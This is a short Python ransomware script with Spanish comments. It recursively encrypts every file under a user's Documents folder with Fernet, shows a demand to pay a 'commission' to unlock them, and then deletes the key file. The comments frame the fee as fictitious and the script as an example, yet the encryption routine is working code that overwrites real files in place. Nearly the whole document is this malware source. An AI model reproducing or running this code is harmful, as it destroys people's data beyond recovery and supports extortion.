import os
from cryptography.fernet import Fernet

# Config del virus ransomwere.
ARCHIVO_DE_SEGREDO = "desbloquear.key"  # Archivo que contiene la clave de desbloqueo del mismo.
COMISION = 100  # Comisión ficticia para el ejemplo.

# Función para generar y guardar una clave de encriptación.
def generar_clave():
    clave = Fernet.generate_key()
    with open(ARCHIVO_DE_SEGREDO, "wb") as clave_file:
        clave_file.write(clave)
    return clave

# Función para cargar una clave de encriptación existente.
def cargar_clave():
    return open(ARCHIVO_DE_SEGREDO, "rb").read()

# Función para encriptar archivos.
def encriptar_archivos(ruta, clave):
    fernet = Fernet(clave)
    for raiz, _, archivos in os.walk(ruta):
        for archivo in archivos:
            ruta_archivo = os.path.join(raiz, archivo)
            if not os.path.isdir(ruta_archivo):
                with open(ruta_archivo, "rb") as f:
                    contenido = f.read()
                contenido_encriptado = fernet.encrypt(contenido)
                with open(ruta_archivo, "wb") as f:
                    f.write(contenido_encriptado)
    print("Archivos encriptados.")

# Función para desencriptar archivos.
def desencriptar_archivos(ruta, clave):
    fernet = Fernet(clave)
    for raiz, _, archivos in os.walk(ruta):
        for archivo in archivos:
            ruta_archivo = os.path.join(raiz, archivo)
            if not os.path.isdir(ruta_archivo):
                with open(ruta_archivo, "rb") as f:
                    contenido_encriptado = f.read()
                contenido_desencriptado = fernet.decrypt(contenido_encriptado)
                with open(ruta_archivo, "wb") as f:
                    f.write(contenido_desencriptado)
    print("Archivos desencriptados.")

# Simular el pago de la comisión y desbloqueo.
def desbloquear_archivos(ruta):
    try:
        clave = cargar_clave()
        print("Clave de desbloqueo encontrada.")
    except FileNotFoundError:
        print(f"No se encontró el archivo de desbloqueo. Por favor, pague la comisión del {COMISION}% para desbloquear los archivos.")
        return

    desencriptar_archivos(ruta, clave)

if __name__ == "__main__":
    ruta = "C:/Users/Usuario/Documents"
    
    # Encriptar los archivos
    clave = generar_clave()
    encriptar_archivos(ruta, clave)

    # Simulación de pago de comisión y desbloqueo
    entrada = input(f"Para desbloquear los archivos, pague una comisión del {COMISION}% y presione 'S' para continuar: ")
    if entrada.lower() == "s":
        desbloquear_archivos(ruta)

    # Eliminar el archivo de clave para simular que el atacante ha borrado la clave después del ataque
    os.remove(ARCHIVO_DE_SEGREDO)
